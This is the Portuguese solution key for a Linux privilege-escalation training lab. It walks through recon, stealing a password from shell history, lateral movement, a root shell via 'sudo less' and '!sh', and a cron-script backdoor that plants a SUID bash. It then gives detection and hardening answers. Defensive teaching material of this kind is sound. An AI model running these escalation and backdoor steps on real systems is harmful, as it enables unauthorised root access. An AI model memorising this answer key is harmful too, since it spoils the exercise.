# 🔓 Solução — Lab 05 (Desafio final)

> ⚠️ **Spoiler total.** Use apenas para conferir depois de rodar o cronômetro.

## Linha do tempo de referência (execução experiente: ~12 min)

| Min | Etapa | Comando | Resultado |
| :-: | :-- | :-- | :-- |
| 0 | Acesso inicial | `su - dev01` | uid=1001 |
| 1 | Recon | `id; sudo -l` | `NOPASSWD: /usr/bin/less` |
| 3 | Recon | `cat ~/.bash_history` | senha do dev02 |
| 5 | Credencial | `grep -rn "FLAG{" /opt/cyberlab` | flag 1 |
| 7 | Lateral | `su - dev02` + `cat ~/flag2.txt` | flag 2 |
| 9 | Escalada | `sudo less /etc/hosts` → `!sh` | root |
| 12 | Flag final | `cat /root/flag3.txt` | flag 3 |

## Passo a passo

### 1. Reconhecimento

```bash
su - dev01
id
sudo -l
```

```
(root) NOPASSWD: /usr/bin/less
```

Já é escalada imediata. Mas o exercício pede a cadeia completa.

```bash
find / -perm -4000 -type f 2>/dev/null | grep -v -E '^/(usr/)?s?bin/'
# /opt/cyberlab/bin/.cache-helper

ls -la /opt/cyberlab/scripts/
# -rwxrwxrwx maintenance.sh
```

### 2. Flag 1

```bash
grep -rn "FLAG{" /opt/cyberlab 2>/dev/null
cat /opt/cyberlab/data/.old-backups/flag1.txt
```

```
FLAG{r3c0n_3_4_b4s3_d3_tud0}
```

### 3. Credencial e flag 2

```bash
cat ~/.bash_history | grep -iE "senha|pass|su "
# ... su dev02  (senha B4ckup#2024)

su - dev02
cat ~/flag2.txt
```

```
FLAG{cr3d3nc141s_n0_lug4r_3rr4d0}
```

### 4. Root

Volte para o dev01 (ou use `sudo` de dentro do dev02, se o grupo permitir — no lab, a regra é do dev01):

```bash
exit          # volta para dev01
sudo less /etc/hosts
```

Dentro do `less`:

```
!sh
```

```bash
id
cat /root/flag3.txt
```

```
FLAG{r00t_c0nqu1st4d4}
```

### Alternativa pela escada do cron (se o sudo falhar)

```bash
echo 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' >> /opt/cyberlab/scripts/maintenance.sh
# aguarde 2 min
/tmp/rootbash -p
```

Depois **limpe**:

```bash
sed -i '/rootbash/d' /opt/cyberlab/scripts/maintenance.sh
rm -f /tmp/rootbash
```

## Gabarito de `deteccao.md`

| Etapa | Artefato | Comando de detecção | Detectado por padrão? |
| :-- | :-- | :-- | :-- |
| Recon | histórico do shell | `cat ~/.bash_history` (forense) / auditd em `~/.bash_history` | ❌ |
| Leitura da flag 1 | acesso ao arquivo | `auditd -w /opt/cyberlab/data/` | ❌ |
| Credencial | `su` | `grep "su\[" /var/log/auth.log` | ⚠️ só se o log for revisado |
| Movimento lateral | sessão `dev02` | `last`, `auth.log`, `journalctl` | ⚠️ parcial |
| Escalada | `sudo` | `grep COMMAND= /var/log/auth.log` | ✅ sim (mas parece legítimo) |
| Contorno do `less` | `!sh` | **nada** no log padrão | ❌ |
| SUID novo (se usar) | `find -perm -4000` | auditoria de execução + baseline | ❌ |

Conclusão esperada: **o log padrão registra o "envelope", não o conteúdo**. Ele te diz que o `less` rodou como root; não te diz que um shell nasceu dentro dele.

## Gabarito de `hardening.md` (5 correções)

```
1. [escalada] remover NOPASSWD do less -> rm /etc/sudoers.d/cyberlab-labs
2. [escalada SUID] retirar bit SUID -> chmod u-s /opt/cyberlab/bin/.cache-helper
3. [escalada cron] restringir script -> chmod 700 /opt/cyberlab/scripts/maintenance.sh
4. [credencial] limpar histórico e usar cofre -> : > ~/.bash_history + gerenciador de segredos
5. [lateral] bloquear contas não usadas e exigir chave -> passwd -l dev02; PermitRootLogin no
6. [detecção] auditar escrita em diretórios sensíveis -> regras do lab 07
```

## Autoavaliação

| Pergunta | Se a resposta for "não"... |
| :-- | :-- |
| Eu saberia refazer sem olhar? | repita em 24h |
| Sei explicar **por que** cada comando funcionou? | volte ao lab correspondente |
| Sei detectar cada passo que dei? | refaça o lab 06 com seus próprios logs |
| Meu `ataque.md` tem saída real colada? | refaça coletando evidência |

## Próximo passo

Rode o lab 06 e tente achar **o seu próprio ataque** nos logs do cenário simulado. Depois o lab 08 e feche o ciclo com o hardening 8/8.
